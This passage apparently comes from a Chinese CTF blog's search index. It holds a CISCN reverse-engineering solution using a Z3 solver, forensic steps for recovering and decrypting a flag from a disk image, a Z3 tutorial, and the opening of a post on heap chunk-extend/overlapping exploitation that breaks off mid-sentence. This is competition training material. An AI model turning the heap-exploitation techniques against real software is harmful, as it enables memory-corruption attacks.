class="string">&#x27;v75&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v76=BitVec(<span class="string">&#x27;v76&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v77=BitVec(<span class="string">&#x27;v77&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v78=BitVec(<span class="string">&#x27;v78&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v79=BitVec(<span class="string">&#x27;v79&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v80=BitVec(<span class="string">&#x27;v80&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v81=BitVec(<span class="string">&#x27;v81&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v82=BitVec(<span class="string">&#x27;v82&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v83=BitVec(<span class="string">&#x27;v83&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v84=BitVec(<span class="string">&#x27;v84&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v85=BitVec(<span class="string">&#x27;v85&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v86=BitVec(<span class="string">&#x27;v86&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v87=BitVec(<span class="string">&#x27;v87&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v4=de[<span class="number">0</span>]</span><br><span class="line">v5=de[<span class="number">1</span>]</span><br><span class="line">v6=de[<span class="number">2</span>]</span><br><span class="line">v7=de[<span class="number">3</span>]</span><br><span class="line">v8=de[<span class="number">4</span>]</span><br><span class="line">v9=de[<span class="number">5</span>]</span><br><span class="line">v10=de[<span class="number">6</span>]</span><br><span class="line">v11=de[<span class="number">7</span>]</span><br><span class="line">v12=de[<span class="number">8</span>]</span><br><span class="line">v13=de[<span class="number">9</span>]</span><br><span class="line">v14=de[<span class="number">10</span>]</span><br><span class="line">v15=de[<span class="number">11</span>]</span><br><span class="line">v16=de[<span class="number">12</span>]</span><br><span class="line">v17=de[<span class="number">13</span>]</span><br><span class="line">v18=de[<span class="number">14</span>]</span><br><span class="line">v19=de[<span class="number">15</span>]</span><br><span class="line">v20=de[<span class="number">16</span>]</span><br><span class="line">v21=de[<span class="number">17</span>]</span><br><span class="line">v22=de[<span class="number">18</span>]</span><br><span class="line">v23=de[<span class="number">19</span>]</span><br><span class="line">v24=de[<span class="number">20</span>]</span><br><span class="line">v25=de[<span class="number">21</span>]</span><br><span class="line">v26=de[<span class="number">22</span>]</span><br><span class="line">v27=de[<span class="number">23</span>]</span><br><span class="line">v28=de[<span class="number">24</span>]</span><br><span class="line">v29=de[<span class="number">25</span>]</span><br><span class="line">v30=de[<span class="number">26</span>]</span><br><span class="line">v31=de[<span class="number">27</span>]</span><br><span class="line">v32=de[<span class="number">28</span>]</span><br><span class="line">v33=de[<span class="number">29</span>]</span><br><span class="line">v34=de[<span class="number">30</span>]</span><br><span class="line">v35=de[<span class="number">31</span>]</span><br><span class="line">v36=de[<span class="number">32</span>]</span><br><span class="line">v37=de[<span class="number">33</span>]</span><br><span class="line">v38=de[<span class="number">34</span>]</span><br><span class="line">v39=de[<span class="number">35</span>]</span><br><span class="line">v40=de[<span class="number">36</span>]</span><br><span class="line">v41=de[<span class="number">37</span>]</span><br><span class="line">v42=de[<span class="number">38</span>]</span><br><span class="line">v43=de[<span class="number">39</span>]</span><br><span class="line">v44=de[<span class="number">40</span>]</span><br><span class="line">v45=de[<span class="number">41</span>]</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(v4 == <span class="number">34</span> * v49 + <span class="number">12</span> * v46 + <span class="number">53</span> * v47 + <span class="number">6</span> * v48 + <span class="number">58</span> * v50 + <span class="number">36</span> * v51 + v52)</span><br><span class="line">s.add(v5 == <span class="number">27</span> * v50 + <span class="number">73</span> * v49 + <span class="number">12</span> * v48 + <span class="number">83</span> * v46 + <span class="number">85</span> * v47 + <span class="number">96</span> * v51 + <span class="number">52</span> * v52)</span><br><span class="line">s.add(v6 == <span class="number">24</span> * v48 + <span class="number">78</span> * v46 + <span class="number">53</span> * v47 + <span class="number">36</span> * v49 + <span class="number">86</span> * v50 + <span class="number">25</span> * v51 + <span class="number">46</span> * v52)</span><br><span class="line">s.add(v7 == <span class="number">78</span> * v47 + <span class="number">39</span> * v46 + <span class="number">52</span> * v48 + <span class="number">9</span> * v49 + <span class="number">62</span> * v50 + <span class="number">37</span> * v51 + <span class="number">84</span> * v52)</span><br><span class="line">s.add(v8 == <span class="number">48</span> * v50 + <span class="number">14</span> * v48 + <span class="number">23</span> * v46 + <span class="number">6</span> * v47 + <span class="number">74</span> * v49 + <span class="number">12</span> * v51 + <span class="number">83</span> * v52)</span><br><span class="line">s.add(v9 == <span class="number">15</span> * v51 + <span class="number">48</span> * v50 + <span class="number">92</span> * v48 + <span class="number">85</span> * v47 + <span class="number">27</span> * v46 + <span class="number">42</span> * v49 + <span class="number">72</span> * v52)</span><br><span class="line">s.add(v10 == <span class="number">26</span> * v51 + <span class="number">67</span> * v49 + <span class="number">6</span> * v47 + <span class="number">4</span> * v46 + <span class="number">3</span> * v48 + <span class="number">68</span> * v52)</span><br><span class="line">s.add(v11 == <span class="number">34</span> * v56 + <span class="number">12</span> * v53 + <span class="number">53</span> * v54 + <span class="number">6</span> * v55 + <span class="number">58</span> * v57 + <span class="number">36</span> * v58 + v59)</span><br><span class="line">s.add(v12 == <span class="number">27</span> * v57 + <span class="number">73</span> * v56 + <span class="number">12</span> * v55 + <span class="number">83</span> * v53 + <span class="number">85</span> * v54 + <span class="number">96</span> * v58 + <span class="number">52</span> * v59)</span><br><span class="line">s.add(v13 == <span class="number">24</span> * v55 + <span class="number">78</span> * v53 + <span class="number">53</span> * v54 + <span class="number">36</span> * v56 + <span class="number">86</span> * v57 + <span class="number">25</span> * v58 + <span class="number">46</span> * v59)</span><br><span class="line">s.add(v14 == <span class="number">78</span> * v54 + <span class="number">39</span> * v53 + <span class="number">52</span> * v55 + <span class="number">9</span> * v56 + <span class="number">62</span> * v57 + <span class="number">37</span> * v58 + <span class="number">84</span> * v59)</span><br><span class="line">s.add(v15 == <span class="number">48</span> * v57 + <span class="number">14</span> * v55 + <span class="number">23</span> * v53 + <span class="number">6</span> * v54 + <span class="number">74</span> * v56 + <span class="number">12</span> * v58 + <span class="number">83</span> * v59)</span><br><span class="line">s.add(v16 == <span class="number">15</span> * v58 + <span class="number">48</span> * v57 + <span class="number">92</span> * v55 + <span class="number">85</span> * v54 + <span class="number">27</span> * v53 + <span class="number">42</span> * v56 + <span class="number">72</span> * v59)</span><br><span class="line">s.add(v17 == <span class="number">26</span> * v58 + <span class="number">67</span> * v56 + <span class="number">6</span> * v54 + <span class="number">4</span> * v53 + <span class="number">3</span> * v55 + <span class="number">68</span> * v59)</span><br><span class="line">s.add(v18 == <span class="number">34</span> * v63 + <span class="number">12</span> * v60 + <span class="number">53</span> * v61 + <span class="number">6</span> * v62 + <span class="number">58</span> * v64 + <span class="number">36</span> * v65 + v66)</span><br><span class="line">s.add(v19 == <span class="number">27</span> * v64 + <span class="number">73</span> * v63 + <span class="number">12</span> * v62 + <span class="number">83</span> * v60 + <span class="number">85</span> * v61 + <span class="number">96</span> * v65 + <span class="number">52</span> * v66)</span><br><span class="line">s.add(v20 == <span class="number">24</span> * v62 + <span class="number">78</span> * v60 + <span class="number">53</span> * v61 + <span class="number">36</span> * v63 + <span class="number">86</span> * v64 + <span class="number">25</span> * v65 + <span class="number">46</span> * v66)</span><br><span class="line">s.add(v21 == <span class="number">78</span> * v61 + <span class="number">39</span> * v60 + <span class="number">52</span> * v62 + <span class="number">9</span> * v63 + <span class="number">62</span> * v64 + <span class="number">37</span> * v65 + <span class="number">84</span> * v66)</span><br><span class="line">s.add(v22 == <span class="number">48</span> * v64 + <span class="number">14</span> * v62 + <span class="number">23</span> * v60 + <span class="number">6</span> * v61 + <span class="number">74</span> * v63 + <span class="number">12</span> * v65 + <span class="number">83</span> * v66)</span><br><span class="line">s.add(v23 == <span class="number">15</span> * v65 + <span class="number">48</span> * v64 + <span class="number">92</span> * v62 + <span class="number">85</span> * v61 + <span class="number">27</span> * v60 + <span class="number">42</span> * v63 + <span class="number">72</span> * v66)</span><br><span class="line">s.add(v24 == <span class="number">26</span> * v65 + <span class="number">67</span> * v63 + <span class="number">6</span> * v61 + <span class="number">4</span> * v60 + <span class="number">3</span> * v62 + <span class="number">68</span> * v66)</span><br><span class="line">s.add(v25 == <span class="number">34</span> * v70 + <span class="number">12</span> * v67 + <span class="number">53</span> * v68 + <span class="number">6</span> * v69 + <span class="number">58</span> * v71 + <span class="number">36</span> * v72 + v73)</span><br><span class="line">s.add(v26 == <span class="number">27</span> * v71 + <span class="number">73</span> * v70 + <span class="number">12</span> * v69 + <span class="number">83</span> * v67 + <span class="number">85</span> * v68 + <span class="number">96</span> * v72 + <span class="number">52</span> * v73)</span><br><span class="line">s.add(v27 == <span class="number">24</span> * v69 + <span class="number">78</span> * v67 + <span class="number">53</span> * v68 + <span class="number">36</span> * v70 + <span class="number">86</span> * v71 + <span class="number">25</span> * v72 + <span class="number">46</span> * v73)</span><br><span class="line">s.add(v28 == <span class="number">78</span> * v68 + <span class="number">39</span> * v67 + <span class="number">52</span> * v69 + <span class="number">9</span> * v70 + <span class="number">62</span> * v71 + <span class="number">37</span> * v72 + <span class="number">84</span> * v73)</span><br><span class="line">s.add(v29 == <span class="number">48</span> * v71 + <span class="number">14</span> * v69 + <span class="number">23</span> * v67 + <span class="number">6</span> * v68 + <span class="number">74</span> * v70 + <span class="number">12</span> * v72 + <span class="number">83</span> * v73)</span><br><span class="line">s.add(v30 == <span class="number">15</span> * v72 + <span class="number">48</span> * v71 + <span class="number">92</span> * v69 + <span class="number">85</span> * v68 + <span class="number">27</span> * v67 + <span class="number">42</span> * v70 + <span class="number">72</span> * v73)</span><br><span class="line">s.add(v31 == <span class="number">26</span> * v72 + <span class="number">67</span> * v70 + <span class="number">6</span> * v68 + <span class="number">4</span> * v67 + <span class="number">3</span> * v69 + <span class="number">68</span> * v73)</span><br><span class="line">s.add(v32 == <span class="number">34</span> * v77 + <span class="number">12</span> * v74 + <span class="number">53</span> * v75 + <span class="number">6</span> * v76 + <span class="number">58</span> * v78 + <span class="number">36</span> * v79 + v80)</span><br><span class="line">s.add(v33 == <span class="number">27</span> * v78 + <span class="number">73</span> * v77 + <span class="number">12</span> * v76 + <span class="number">83</span> * v74 + <span class="number">85</span> * v75 + <span class="number">96</span> * v79 + <span class="number">52</span> * v80)</span><br><span class="line">s.add(v34 == <span class="number">24</span> * v76 + <span class="number">78</span> * v74 + <span class="number">53</span> * v75 + <span class="number">36</span> * v77 + <span class="number">86</span> * v78 + <span class="number">25</span> * v79 + <span class="number">46</span> * v80)</span><br><span class="line">s.add(v35 == <span class="number">78</span> * v75 + <span class="number">39</span> * v74 + <span class="number">52</span> * v76 + <span class="number">9</span> * v77 + <span class="number">62</span> * v78 + <span class="number">37</span> * v79 + <span class="number">84</span> * v80)</span><br><span class="line">s.add(v36 == <span class="number">48</span> * v78 + <span class="number">14</span> * v76 + <span class="number">23</span> * v74 + <span class="number">6</span> * v75 + <span class="number">74</span> * v77 + <span class="number">12</span> * v79 + <span class="number">83</span> * v80)</span><br><span class="line">s.add(v37 == <span class="number">15</span> * v79 + <span class="number">48</span> * v78 + <span class="number">92</span> * v76 + <span class="number">85</span> * v75 + <span class="number">27</span> * v74 + <span class="number">42</span> * v77 + <span class="number">72</span> * v80)</span><br><span class="line">s.add(v38 == <span class="number">26</span> * v79 + <span class="number">67</span> * v77 + <span class="number">6</span> * v75 + <span class="number">4</span> * v74 + <span class="number">3</span> * v76 + <span class="number">68</span> * v80)</span><br><span class="line">s.add(v39 == <span class="number">34</span> * v84 + <span class="number">12</span> * v81 + <span class="number">53</span> * v82 + <span class="number">6</span> * v83 + <span class="number">58</span> * v85 + <span class="number">36</span> * v86 + v87)</span><br><span class="line">s.add(v40 == <span class="number">27</span> * v85 + <span class="number">73</span> * v84 + <span class="number">12</span> * v83 + <span class="number">83</span> * v81 + <span class="number">85</span> * v82 + <span class="number">96</span> * v86 + <span class="number">52</span> * v87)</span><br><span class="line">s.add(v41 == <span class="number">24</span> * v83 + <span class="number">78</span> * v81 + <span class="number">53</span> * v82 + <span class="number">36</span> * v84 + <span class="number">86</span> * v85 + <span class="number">25</span> * v86 + <span class="number">46</span> * v87)</span><br><span class="line">s.add(v42 == <span class="number">78</span> * v82 + <span class="number">39</span> * v81 + <span class="number">52</span> * v83 + <span class="number">9</span> * v84 + <span class="number">62</span> * v85 + <span class="number">37</span> * v86 + <span class="number">84</span> * v87)</span><br><span class="line">s.add(v43 == <span class="number">48</span> * v85 + <span class="number">14</span> * v83 + <span class="number">23</span> * v81 + <span class="number">6</span> * v82 + <span class="number">74</span> * v84 + <span class="number">12</span> * v86 + <span class="number">83</span> * v87)</span><br><span class="line">s.add(v44 == <span class="number">15</span> * v86 + <span class="number">48</span> * v85 + <span class="number">92</span> * v83 + <span class="number">85</span> * v82 + <span class="number">27</span> * v81 + <span class="number">42</span> * v84 + <span class="number">72</span> * v87)</span><br><span class="line">s.add(v45 == <span class="number">26</span> * v86 + <span class="number">67</span> * v84 + <span class="number">6</span> * v82 + <span class="number">4</span> * v81 + <span class="number">3</span> * v83 + <span class="number">68</span> * v87)</span><br><span class="line"><span class="built_in">print</span> s.check()</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="built_in">print</span> m</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;no answer&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> m.decls():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;%s = %s&quot;</span> % (d.name(), m[d])</span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><ul><li>点进去助力一下，过了段时间出来个小喇叭说得到flag了交了就好了</li></ul><h2 id="电脑被黑"><a href="#电脑被黑" class="headerlink" title="电脑被黑"></a>电脑被黑</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~:file disk_dump </span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; disk_dump: Linux rev 1.0 ext3 filesystem data, UUID=4a3914c4-f9c1-4ec7-b682-c5554ce2f47f (large files)</span></span><br></pre></td></tr></table></figure><p>ext3 filesystem data linux 平台下的备份移动文件，重新挂载可以读取原始资料</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o loop .&#x2F;disk_dump &#x2F;mnt</span><br></pre></td></tr></table></figure><p>demo 为加密程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">v7 = fopen(argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v7 )</span><br><span class="line">&#123;</span><br><span class="line">  stream = fopen(argv[<span class="number">1</span>], <span class="string">&quot;rb+&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = fgetc(v7);</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      fputc(v4 ^ (v5 + v6), stream);</span><br><span class="line">      v4 += <span class="number">34</span>;</span><br><span class="line">      v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v7);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cannot open file&quot;</span>, <span class="string">&quot;rb+&quot;</span>, argv);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;cannot open this file&quot;</span>, <span class="string">&quot;rb&quot;</span>, argv);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据算法可以知道加密后的密文写回到原文件中。使用 fakeflag.txt 内容进行解密乱码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings disk_dump | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><p>找到有另外一个 flag.txt ，数据恢复出来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extundelete --restore-all disk_dump -o out</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : $&#123;DATE&#125; $&#123;TIME&#125;</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : 电脑被黑.py</span></span><br><span class="line"><span class="comment"># @Software: $&#123;PRODUCT_NAME&#125;</span></span><br><span class="line">c = [<span class="number">0x44</span>,<span class="number">0x2a</span>,<span class="number">0x03</span>,<span class="number">0xe5</span>,<span class="number">0x29</span>,<span class="number">0xa3</span>,<span class="number">0xaf</span>,<span class="number">0x62</span>,<span class="number">0x05</span>,<span class="number">0x31</span>,<span class="number">0x4e</span>,<span class="number">0xf3</span>,<span class="number">0xd6</span>,<span class="number">0xeb</span>,<span class="number">0x90</span>,<span class="number">0x66</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xb7</span>,<span class="number">0x92</span>,<span class="number">0xf6</span>,<span class="number">0xd7</span>,<span class="number">0x4d</span>,<span class="number">0x0b</span>,<span class="number">0x6a</span>,<span class="number">0x41</span>,<span class="number">0xa3</span>,<span class="number">0x85</span>,<span class="number">0xef</span>,<span class="number">0x90</span>,<span class="number">0x5a</span>,<span class="number">0x7e</span>,<span class="number">0x5b</span>,<span class="number">0xec</span>,<span class="number">0xc1</span>,<span class="number">0xf0</span>,<span class="number">0xd4</span>,<span class="number">0x61</span>,<span class="number">0x12</span>,<span class="number">0x12</span>,<span class="number">0x45</span>,<span class="number">0xeb</span>,<span class="number">0xb8</span>]</span><br><span class="line">v4 = <span class="number">34</span></span><br><span class="line">v5 = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cr <span class="keyword">in</span> c:</span><br><span class="line">flag += <span class="built_in">chr</span>(((cr^v4)-v5)%<span class="number">256</span>)</span><br><span class="line">v4+=<span class="number">34</span></span><br><span class="line">v5=(v5+<span class="number">2</span>)&amp;<span class="number">0xf</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="the-best-ctf-game"><a href="#the-best-ctf-game" class="headerlink" title="the_best_ctf_game"></a>the_best_ctf_game</h2><p>记事本直接打开，删除无用字节得到 flag</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CISCN </tag>
            
            <tag> 国赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Z3库-多元方程一把梭哈</title>
      <link href="archives/4c7d7bc8/"/>
      <url>archives/4c7d7bc8/</url>
      
        <content type="html"><![CDATA[<p>国赛上逆向有道题目要算 37 元一次方程，肯定不能用手算。解决方法是用 python Z3 库，这个库可以帮助我们<strong>解决方程的计算问题</strong>。</p><p>Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 <a href="https://link.jianshu.com/?t=https://link.zhihu.com/?target=http://angr.io/">angr</a> 也内置了一个修改版的 Z3。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y = Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">solve(x &gt; <span class="number">2</span>, y &lt; <span class="number">10</span>, x + <span class="number">2</span>*y == <span class="number">7</span>)</span><br><span class="line"><span class="comment"># [y = 0, x = 7]</span></span><br></pre></td></tr></table></figure><p>做题约束条件肯定不会这么少，所以需要实例化一个 <code>Solver()</code> 对象，方便我们添加更多的约束条件。</p><h2 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h2><h3 id="Solver-对象"><a href="#Solver-对象" class="headerlink" title="Solver 对象"></a>Solver 对象</h3><p>创建约束求解器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solver = Solver()</span><br></pre></td></tr></table></figure><h3 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h3><h4 id="Int-整数型"><a href="#Int-整数型" class="headerlink" title="Int - 整数型"></a>Int - 整数型</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 声明单个变量</span></span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="comment"># 声明多个变量</span></span><br><span class="line">y,z = Ints(<span class="string">&#x27;y z&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="Real-实数型"><a href="#Real-实数型" class="headerlink" title="Real - 实数型"></a>Real - 实数型</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 声明单个变量</span></span><br><span class="line">x = Real(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="comment"># 声明多个变量</span></span><br><span class="line">y,z = Reals(<span class="string">&#x27;y z&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="BitVec-向量（位与运算）"><a href="#BitVec-向量（位与运算）" class="headerlink" title="BitVec - 向量（位与运算）"></a>BitVec - 向量（位与运算）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 声明单个变量</span></span><br><span class="line">x = BitVec(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="comment"># 声明多个变量</span></span><br><span class="line">y,z = BitVecs(<span class="string">&#x27;y z&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>变量设置的类型可能会影响到最后求解的结果。可以先 check 一下看看有没有解，然后再判断是否需要切换变量的类型。</p></blockquote><h3 id="添加约束条件"><a href="#添加约束条件" class="headerlink" title="添加约束条件"></a>添加约束条件</h3><p>一行一个约束条件，这里的约束条件就是方程等式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">solver.add(x**<span class="number">2</span>+y**<span class="number">2</span>==<span class="number">74</span>)</span><br><span class="line">solver.add(x**<span class="number">5</span>-y==z)</span><br><span class="line"><span class="comment"># [y = -7, x = 5, z = 3132]</span></span><br></pre></td></tr></table></figure><h3 id="判断是否有解"><a href="#判断是否有解" class="headerlink" title="判断是否有解"></a>判断是否有解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    print(<span class="string">&quot;solver&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;no solver&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="求解并输出"><a href="#求解并输出" class="headerlink" title="求解并输出"></a>求解并输出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ans = solver.model()</span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><h2 id="额外补充"><a href="#额外补充" class="headerlink" title="额外补充"></a>额外补充</h2><p>通常如果是做题的话，解密出来很可能是 flag ，也就是 ascii 码，所以为了进一步确定答案可以给每一个变量都加上额外的一条约束，约束其结果只能在可见 ascii 码范围以内：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">solver.add(x &lt; <span class="number">127</span>)</span><br><span class="line">solver.add(x &gt;= <span class="number">32</span>)</span><br></pre></td></tr></table></figure><h2 id="练习例题"><a href="#练习例题" class="headerlink" title="练习例题"></a>练习例题</h2><ul><li><a href="https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_CISCN/Reverse/z3">2020 CISCN z3</a></li><li><a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=889071">[CTF] 使用python z3约束解ctf题目 练手</a></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://blog.csdn.net/qq_33438733/article/details/82011892">Z3 学习笔记</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chunk Extend/Overlapping | 堆拓展、重叠</title>
      <link href="archives/d269f0ac/"/>
      <url>archives/d269f0ac/</url>
      
        <content type="html"><![CDATA[<h1 id="堆拓展-amp-溢出"><a href="#堆拓展-amp-溢出" class="headerlink" title="堆拓展&amp;溢出"></a>堆拓展&amp;溢出</h1><blockquote><p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p></blockquote><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p><p>在 ptmalloc 中，<strong>获取 chunk 块大小</strong>的操作如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p><p>在 ptmalloc 中，<strong>获取下一 chunk 